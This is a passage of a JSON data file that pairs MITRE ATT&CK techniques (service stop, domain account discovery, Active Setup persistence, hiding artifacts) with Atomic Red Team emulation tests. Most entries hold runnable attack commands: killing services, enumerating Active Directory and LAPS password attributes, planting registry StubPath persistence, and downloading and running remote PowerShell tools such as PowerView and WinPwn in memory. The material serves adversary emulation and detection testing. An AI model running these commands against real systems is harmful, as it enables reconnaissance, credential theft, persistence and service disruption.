\"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n", "name": "powershell"}}]}, "T1489": {"name": "Service Stop", "technique_id": "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b", "external_id": "T1489", "data_components": ["Process Termination", "OS API Execution", "Command Execution", "Service Metadata", "Windows Registry Key Modification", "File Modification", "Process Creation"], "kill_chain_phases": ["impact"], "data_source_platforms": [], "mitigations": ["course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9"], "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)", "atomic_tests": [{"name": "Windows - Stop service using Service Controller", "auto_generated_guid": "21dfb440-830d-4c86-a3e5-2a491d5a8d04", "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "Name of a service to stop", "type": "string", "default": "spooler"}}, "executor": {"command": "sc.exe stop #{service_name}\n", "cleanup_command": "sc.exe start #{service_name} >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - Stop service using net.exe", "auto_generated_guid": "41274289-ec9c-4213-bea4-e43c4aa57954", "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "Name of a service to stop", "type": "string", "default": "spooler"}}, "executor": {"command": "net.exe stop #{service_name}\n", "cleanup_command": "net.exe start #{service_name} >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - Stop service by killing process", "auto_generated_guid": "f3191b84-c38b-400b-867e-3a217a27795f", "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "supported_platforms": ["windows"], "input_arguments": {"process_name": {"description": "Name of a process to kill", "type": "string", "default": "spoolsv.exe"}}, "executor": {"command": "taskkill.exe /f /im #{process_name}\n", "name": "command_prompt"}}]}, "T1087.002": {"name": "Domain Account", "technique_id": "attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af", "external_id": "T1087.002", "data_components": ["Network Traffic Content", "Group Enumeration", "Command Execution", "Process Creation", "OS API Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3"], "description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.  ", "atomic_tests": [{"name": "Enumerate all accounts (Domain)", "auto_generated_guid": "6fbc9e68-5ad7-444a-bd11-8bf3136c477e", "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n", "supported_platforms": ["windows"], "executor": {"command": "net user /domain\nnet group /domain\n", "name": "command_prompt"}}, {"name": "Enumerate all accounts via PowerShell (Domain)", "auto_generated_guid": "8b8a6449-be98-4f42-afd2-dedddc7453b2", "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "net user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n", "name": "powershell"}}, {"name": "Enumerate logged on users via CMD (Domain)", "auto_generated_guid": "161dcd85-d014-4f5e-900c-d3eaae82a0f7", "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "Name of remote system to query", "type": "string", "default": "%COMPUTERNAME%"}}, "executor": {"command": "query user /SERVER:#{computer_name}\n", "name": "command_prompt"}}, {"name": "Automated AD Recon (ADRecon)", "auto_generated_guid": "95018438-454a-468c-a0fa-59c800149b59", "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"adrecon_path": {"description": "Path of ADRecon.ps1 file", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ADRecon must exist on disk at specified location (#{adrecon_path})\n", "prereq_command": "if (Test-Path \"#{adrecon_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1\" -OutFile \"#{adrecon_path}\"\n"}], "executor": {"command": "Invoke-Expression \"#{adrecon_path}\"\n", "cleanup_command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse\n", "name": "powershell"}}, {"name": "Adfind -Listing password policy", "auto_generated_guid": "736b4f53-f400-4c22-855d-1a6b5a551600", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n", "name": "command_prompt"}}, {"name": "Adfind - Enumerate Active Directory Admins", "auto_generated_guid": "b95fd967-4e62-4109-b48d-265edfd28c3a", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp\n", "name": "command_prompt"}}, {"name": "Adfind - Enumerate Active Directory User Objects", "auto_generated_guid": "e1ec8d20-509a-4b9a-b820-06c9b2da8eb7", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person)\n", "name": "command_prompt"}}, {"name": "Adfind - Enumerate Active Directory Exchange AD Objects", "auto_generated_guid": "5e2938fb-f919-47b6-8b29-2f6a1f718e99", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses\n", "name": "command_prompt"}}, {"name": "Enumerate Default Domain Admin Details (Domain)", "auto_generated_guid": "c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef", "description": "This test will enumerate the details of the built-in domain admin account\n", "supported_platforms": ["windows"], "executor": {"command": "net user administrator /domain\n", "name": "command_prompt"}}, {"name": "Enumerate Active Directory for Unconstrained Delegation", "auto_generated_guid": "46f8dbe9-22a5-4770-8513-66119c5be63b", "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Domain FQDN", "type": "string", "default": "$env:UserDnsDomain"}, "uac_prop": {"description": "UAC Property to search", "type": "integer", "default": 524288}}, "dependencies": [{"description": "PowerShell ActiveDirectory Module must be installed\n", "prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n", "get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}\n"}}, {"name": "Get-DomainUser with PowerView", "auto_generated_guid": "93662494-5ed7-4454-a04c-8c8372808ac2", "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n", "name": "powershell"}}, {"name": "Enumerate Active Directory Users with ADSISearcher", "auto_generated_guid": "02e8be5a-3065-4e54-8cc8-a14d138834d3", "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n"}}, {"name": "Enumerate Linked Policies In ADSISearcher Discovery", "auto_generated_guid": "7ab0205a-34e4-4a44-9b04-e1541d1a57be", "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n"}}, {"name": "Enumerate Root Domain linked policies Discovery", "auto_generated_guid": "00c652e2-0750-4ca6-82ff-0204684a6fe4", "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n"}}, {"name": "WinPwn - generaldomaininfo", "auto_generated_guid": "ce483c35-c74b-45a7-a670-631d1e69db3d", "description": "Gathers general domain information using the generaldomaininfo function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "Kerbrute - userenum", "auto_generated_guid": "f450461c-18d1-4452-9f0d-2c42c3f08624", "description": "Enumerates active directory usernames using the userenum function of Kerbrute", "supported_platforms": ["windows"], "input_arguments": {"Domain": {"description": "Domain that is being tested against", "type": "string", "default": "$env:USERDOMAIN"}, "DomainController": {"description": "Domain Controller that is being tested against", "type": "string", "default": "$env:UserDnsDomain"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"}, {"description": "username text file must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"\n"}], "executor": {"command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"", "name": "powershell"}}, {"name": "Wevtutil - Discover NTLM Users Remote", "auto_generated_guid": "b8a563d4-a836-4993-a74e-0a19b8481bfe", "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n", "supported_platforms": ["windows"], "executor": {"command": "$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'", "cleanup_command": "Remove-Item -Path \\\\$IpAddress\\c$\\ntlmusers.evtx\n", "name": "powershell"}}, {"name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties", "auto_generated_guid": "394012d9-2164-4d4f-b9e5-acf30ba933fe", "description": "This test executes LDAP query using powershell command Get-ADComputer and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime", "supported_platforms": ["windows"], "input_arguments": {"hostname": {"description": "Name of the host", "type": "string", "default": "$env:computername"}}, "executor": {"command": "Get-ADComputer #{hostname} -Properties *", "cleanup_command": null, "name": "powershell", "elevation_required": false}}, {"name": "Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property", "auto_generated_guid": "6e85bdf9-7bc4-4259-ac0f-f0cb39964443", "description": "This test executes LDAP query using powershell command Get-ADComputer and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime", "supported_platforms": ["windows"], "input_arguments": {"hostname": {"description": "Name of the host", "type": "string", "default": "$env:computername"}}, "executor": {"command": "Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime", "cleanup_command": null, "name": "powershell", "elevation_required": false}}, {"name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope", "auto_generated_guid": "ffbcfd62-15d6-4989-a21a-80bfc8e58bb5", "description": "This test executes LDAP query using powershell command Get-ADComputer with SearchScope as subtree and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime", "supported_platforms": ["windows"], "executor": {"command": "Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *", "cleanup_command": null, "name": "powershell", "elevation_required": false}}, {"name": "Suspicious LAPS Attributes Query with adfind all properties", "auto_generated_guid": "abf00f6c-9983-4d9a-afbc-6b1c6c6448e1", "description": "This test executes LDAP query using adfind command and lists all the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Domain of the host", "type": "string", "default": "$env:USERDOMAIN"}}, "executor": {"command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -h #{domain} -s subtree -f \"objectclass=computer\" *\n", "cleanup_command": null, "name": "powershell", "elevation_required": false}}, {"name": "Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd", "auto_generated_guid": "51a98f96-0269-4e09-a10f-e307779a8b05", "description": "This test executes LDAP query using adfind command and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Domain of the host", "type": "string", "default": "$env:USERDOMAIN"}}, "executor": {"command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n", "cleanup_command": null, "name": "powershell", "elevation_required": false}}, {"name": "Active Directory Domain Search", "auto_generated_guid": "096b6d2a-b63f-4100-8fa0-525da4cd25ca", "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n", "supported_platforms": ["linux"], "input_arguments": {"domain": {"description": "The domain to be tested", "type": "string", "default": "example"}, "top_level_domain": {"description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)", "type": "string", "default": "test"}, "user": {"description": "username@domain of a user within the ad database", "type": "string", "default": "user@example.test"}, "password": {"description": "password of the user with admin privileges referenced in admin_user", "type": "string", "default": "s3CurePssw0rD!"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n", "prereq_command": "which ldapsearch\n", "get_prereq_command": "echo ldapsearch not found\n"}], "executor": {"elevation_required": false, "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" -s sub -a always -z 1000 dn\n", "name": "sh"}}]}, "T1547.014": {"name": "Active Setup", "technique_id": "attack-pattern--22522668-ddf6-470b-a027-9d6866679f67", "external_id": "T1547.014", "data_components": ["Command Execution", "Windows Registry Key Modification", "Windows Registry Key Creation", "Process Creation"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.", "atomic_tests": [{"name": "HKLM - Add atomic_test key to launch executable as part of user setup", "auto_generated_guid": "deff4586-0517-49c2-981d-bbea24d48d71", "description": "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n", "supported_platforms": ["windows"], "input_arguments": {"payload": {"description": "Payload to run once during login", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"#{payload}\" -Force \n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup", "cleanup_command": "Remove-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore\nRemove-Item \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" -Force -ErrorAction Ignore", "name": "powershell", "elevation_required": true}}, {"name": "HKLM - Add malicious StubPath value to existing Active Setup Entry", "auto_generated_guid": "39e417dd-4fed-4d9c-ae3a-ba433b4d0e9a", "description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n", "supported_platforms": ["windows"], "input_arguments": {"payload": {"description": "Payload to run once during login", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"#{payload}\" -Force\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup", "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"StubPath\" -Force\nRemove-ItemProperty \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Force", "name": "powershell", "elevation_required": true}}, {"name": "HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number", "auto_generated_guid": "04d55cef-f283-40ba-ae2a-316bc3b5e78c", "description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n", "supported_platforms": ["windows"], "executor": {"command": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup\n", "name": "powershell", "elevation_required": true}}]}, "T1564": {"name": "Hide Artifacts", "technique_id": "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8", "external_id": "T1564", "data_components": ["Firmware Modification", "User Account Creation", "Application Log Content", "Process Creation", "User Account Metadata", "Command Execution", "File Modification", "File Metadata", "Windows Registry Key Modification", "File Creation", "Script Execution", "Service Creation", "OS API Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)", "atomic_tests": [{"name": "Extract binary files via VBA", "auto_generated_guid": "6afe288a-8a8b-4d33-a629-8d03ba9dad3a", "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of 